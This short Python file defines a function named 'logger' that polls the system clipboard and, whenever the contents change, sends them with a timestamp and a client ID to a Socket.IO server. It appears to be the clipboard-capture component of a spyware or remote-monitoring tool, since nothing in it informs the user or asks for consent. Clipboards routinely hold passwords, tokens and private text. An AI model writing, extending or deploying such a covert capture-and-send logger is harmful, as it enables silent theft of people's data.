from pyperclip import paste
from datetime import datetime

import socketio

previous_clipboard_content = ""

def logger(sio, clientId):
	global previous_clipboard_content
	clipboard_content = paste()
	if clipboard_content != previous_clipboard_content:
		previous_clipboard_content = clipboard_content
		now = datetime.now()
		formatted_date = now.strftime("%d.%m.%Y %H:%M:%S")
		text = {"clientId": clientId, "text": f"<br>{formatted_date}: {clipboard_content}"}
		sio.emit('clipboard', text)